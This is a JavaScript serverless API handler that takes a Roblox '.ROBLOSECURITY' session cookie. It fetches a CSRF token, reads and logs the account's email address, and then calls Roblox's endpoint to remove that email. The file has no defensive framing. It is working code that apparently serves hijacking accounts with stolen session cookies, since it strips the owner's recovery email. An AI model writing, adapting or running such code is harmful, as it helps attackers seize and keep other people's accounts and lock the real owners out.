const fetch = require('node-fetch');

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { cookie } = req.body;

  if (!cookie || !cookie.includes('_|')) {
    return res.status(400).json({ success: false, error: 'Missing or invalid cookie' });
  }

  try {
    // Step 1: Get CSRF Token
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });

    const csrfToken = csrfRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to fetch CSRF token');

    // Step 2: Check if email exists
    const emailRes = await fetch('https://accountinformation.roblox.com/v1/email', {
      method: 'GET',
      headers: {
        'X-CSRF-TOKEN': csrfToken,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet'
      }
    });

    const emailData = await emailRes.json();
    console.log('Email API response:', emailData); // <- Log for debugging

    if (!emailData || !emailData.data || !emailData.data.EmailAddress) {
      return res.status(400).json({ success: false, error: 'No email found on account or invalid cookie' });
    }

    // Step 3: Remove email
    const removeRes = await fetch('https://accountinformation.roblox.com/v1/email/remove', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet'
      }
    });

    const removeData = await removeRes.json();
    console.log('Remove response:', removeData);

    if (removeData.errors) {
      return res.status(500).json({ success: false, error: 'Failed to remove email' });
    }

    return res.status(200).json({ success: true, message: 'Email successfully removed ✅' });

  } catch (err) {
    console.error('Error:', err);
    return res.status(500).json({ success: false, error: 'Internal server error' });
  }
}
